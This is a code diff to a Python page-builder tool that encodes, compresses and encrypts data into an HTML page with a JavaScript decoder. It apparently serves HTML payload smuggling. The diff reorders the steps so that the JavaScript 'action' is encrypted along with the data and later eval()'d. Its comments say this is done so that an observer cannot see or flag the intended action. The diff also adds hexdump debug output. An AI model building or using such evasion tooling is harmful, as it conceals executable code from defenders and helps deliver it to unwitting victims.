@@ -7,7 +7,7 @@ import os
 import sys
 from typing import Optional, Any
 # local
-from .minified_js import B64DECODE, B85DECODE, DECRYPT, UNZIP
+from .minified_js import B64DECODE, B85DECODE, DECRYPT, UNZIP, HEXDUMP
 
 SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
 DEFAULT_TEMPLATE_FILE = os.path.join(SCRIPT_DIR, "template.html")
@@ -96,6 +96,16 @@ class PageBuilder:
         encoded_data = self.input_data
         js_payload_action = self.js_payload
 
+        if self.encryptor:
+            library_code += self.decrypt_code
+            # OPSEC: Also encrypt the action, so that an observer can not see/flag what we want to do
+            # We hack this into the existing schema by encrypting <PAYLOAD_ACTION_JS_TO_EVAL>\x00<ORIGINAL_DATA>.
+            # Since encryption is done after compression, we should also compress our data (otherwise the handling gets hard)
+            encoded_data = js_payload_action.encode() + b"\x00" + encoded_data
+            # Then we modify our action to extract the code to execute and the original data.
+            # This is much easier than modifying the existing encryption code to reuse the password, key, etc and perform separate decryptions for the payload and the action
+            js_payload_action = "idx=og_data.indexOf(0);code=new TextDecoder().decode(og_data.slice(0,idx));og_data=og_data.slice(idx+1);eval(code);"
+
         if compression == "gzip":
             library_code += UNZIP
             encoded_data = gzip.compress(encoded_data)
@@ -105,15 +115,7 @@ class PageBuilder:
             raise Exception(f"Unknown compression method '{compression}'")
 
         if self.encryptor:
-            library_code += self.decrypt_code
-            # OPSEC: Also encrypt the action, so that an observer can not see/flag what we want to do
-            # We hack this into the existing schema by encrypting <PAYLOAD_ACTION_JS_TO_EVAL>\x00<ORIGINAL_DATA>.
-            encoded_data = js_payload_action.encode() + b"\x00" + encoded_data
             encoded_data = self.encryptor.encrypt_with_reused_iv(encoded_data)
-
-            # Then we modify our action to extract the code to execute and the original data.
-            # This is much easier than modifying the existing encryption code to reuse the password, key, etc and perform separate decryptions for the payload and the action
-            js_payload_action = "idx=og_data.indexOf(0);code=new TextDecoder().decode(og_data.slice(0,idx));og_data=og_data.slice(idx+1);eval(code);"
 
         if encoding == "ascii85":
             library_code += B85DECODE
@@ -127,15 +129,17 @@ class PageBuilder:
             raise Exception(f"Unknown encoding method '{compression}'")
 
         if insert_debug_statements:
+            library_code += HEXDUMP
             glue_decrypt = ""
             if self.encryptor:
-                glue_decrypt += "data=await decryptLoop(data);console.log('Decrypted:',data);"
+                glue_decrypt += "data=await decryptLoop(data);log_hexdump('Decrypted',data);"
             if compression == "gzip":
-                glue_decrypt += "data=unzip(data);console.log('Unzipped:',data);"
+                glue_decrypt += "data=unzip(data);log_hexdump('Unzipped',data);"
 
-            glue_code = f"""async function main(data) {{
-    console.log('Encoded:',data);
-    data={decode_fn}(data);console.log('Decoded:',data);
+            glue_code = f"""const log_hexdump=(name,data)=>console.log(`Hexdump of ${{name}}:\\n`, hexdump(data));
+            async function main(data) {{
+    log_hexdump('Encoded',data);
+    data={decode_fn}(data);log_hexdump('Decoded',data);
     {glue_decrypt}
     action(data);
 }}main(c_data);""".replace("\n", "").replace("\r", "").replace("    ", "")
